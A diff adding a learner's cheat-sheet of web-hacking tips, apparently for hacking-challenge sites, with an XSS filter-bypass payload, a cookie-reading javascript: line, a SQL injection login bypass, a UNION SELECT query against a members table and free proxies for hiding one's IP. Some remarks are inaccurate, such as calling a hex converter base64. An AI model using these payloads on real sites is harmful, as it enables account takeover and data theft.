@@ -1,0 +1,34 @@
+everysite has
+"/robots.txt" use it to find some data
+
+https://www.unitconverters.net/numbers/binary-to-base-16.htm
+use this website to convert binary to base64
+
+https://www.dcode.fr/sha256-hash
+sha256 hash decoder
+
+try messing with file downloaded
+
+javascript:alert(document.cookie);
+
+-to find out cookie and mess with it
+
+<s<script>cript>alert('HackThis!!');</s</script>cript>
+
+// bypass xss filter with this lulllllllll
+
+http://freeproxylists.com/us/1547701230.html
+- to get free proxies to hide ip
+
+http://www.checker.freeproxy.ru/checker/
+- to chec for ip if working or dead
+
+javascript:alert(thecode); // the code is variable type this in console to find its value
+
+if any tought maths algorithm comes let the console deal with it (copy and paste code in console)
+
+'OR 1==1-- // put this in both user and pass if it has sqli vulnerabity it is gone
+
+?browse&q=i'+UNION+SELECT+username, admin+FROM+members+WHERE+admin=
+
+https://hashkiller.co.uk/sha1-decrypter.aspx // sha1 decryptor
